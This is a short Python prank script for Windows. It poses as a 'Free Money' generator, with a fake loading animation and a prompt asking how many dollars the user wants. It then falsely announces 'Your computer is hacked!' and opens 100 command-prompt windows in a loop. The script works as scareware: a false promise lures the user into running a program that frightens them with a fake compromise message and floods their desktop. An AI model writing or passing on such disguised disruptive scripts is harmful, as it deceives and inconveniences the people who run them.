import os
from time import sleep
import random
from colorama import init
from termcolor import colored
 

init()
os.system('cls')


letters = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
thev = "Loading...... "
index = 0
sleep(0.2)

for j in range(60):
    theletter = random.choice(letters)
    thev += theletter
    print(colored(thev,'red'))
    sleep(0.007)
    os.system('cls')

print(colored("Loading finished!", 'yellow'))
sleep(1)
os.system('cls')


print("")
print("")
print("")
print("")



print(colored('███████╗██████╗░███████╗███████╗  ███╗░░░███╗░█████╗░███╗░░██╗███████╗██╗░░░██╗','green'))
sleep(0.1)
print(colored('██╔════╝██╔══██╗██╔════╝██╔════╝  ████╗░████║██╔══██╗████╗░██║██╔════╝╚██╗░██╔╝','green'))
sleep(0.1)
print(colored('█████╗░░██████╔╝█████╗░░█████╗░░  ██╔████╔██║██║░░██║██╔██╗██║█████╗░░░╚████╔╝░','green'))
sleep(0.1)
print(colored('██╔══╝░░██╔══██╗██╔══╝░░██╔══╝░░  ██║╚██╔╝██║██║░░██║██║╚████║██╔══╝░░░░╚██╔╝░░','green'))
sleep(0.1)
print(colored('██║░░░░░██║░░██║███████╗███████╗  ██║░╚═╝░██║╚█████╔╝██║░╚███║███████╗░░░██║░░░','green'))
sleep(0.1)
print(colored('╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░','green'))
sleep(0.1)

input("How much money do you want? (in dollars)\n")

sleep(0.9)

print(colored('█▄█ █▀█ █░█ █▀█   █▀▀ █▀█ █▀▄▀█ █▀█ █░█ ▀█▀ █▀▀ █▀█   █ █▀   █░█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀▄ █', 'red'))
print(colored('░█░ █▄█ █▄█ █▀▄   █▄▄ █▄█ █░▀░█ █▀▀ █▄█ ░█░ ██▄ █▀▄   █ ▄█   █▀█ █▀█ █▄▄ █░█ ██▄ █▄▀ ▄', 'red'))


for i in range(100):
   os.system('start cmd')
